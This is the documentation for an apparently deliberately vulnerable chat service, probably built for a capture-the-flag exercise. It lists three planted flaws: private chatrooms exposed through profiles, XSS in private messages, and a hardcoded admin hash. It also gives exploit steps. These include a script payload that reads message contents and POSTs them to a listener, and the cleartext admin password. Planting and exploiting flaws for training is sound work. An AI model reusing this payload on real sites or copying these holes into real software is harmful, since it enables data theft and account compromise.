Service documentation
======================
# Vulnerabilities

## Access to private chatrooms

- Category: Misconfiguration
- Difficulty: Easy

Profiles list all chatrooms a user is a member of. This includes private chatrooms. Using the name of the chatroom, it is possible to join the chatroom.

## Cross-Site Scripting (XSS)

- Category: XSS
- Difficulty: Medium

The new private message popup is vulnerable to XSS. The message is not sanitized and can be used to execute arbitrary JavaScript code.

## Admin password

- Category: Information disclosure
- Difficulty: Very Hard

The hashed admin password is written in the source code. Hash cannot be cracked using online tools.

# Exploits

## Access to private chatrooms
    get http://localhost:3000/profiles/foo
    get http://localhost:3000/chatrooms/secret
## XSS
    post http://localhost:3000/messages
    body: {"recipient":"foo", "message":"<script>function getText(){let text='';let messages = document.getElementsByClassName('message');for(let i = 0; i < messages.length; i++){text += messages[i].innerHTML;}return text; }fetch('http://localhost:6452/', {method: 'POST', body:'username=' + getText(),headers: { 'Content-Type': 'application/x-www-form-urlencoded', },}); </script>"}
## Admin password
    password is "C0rr3ctH0rs3BatterStaple"


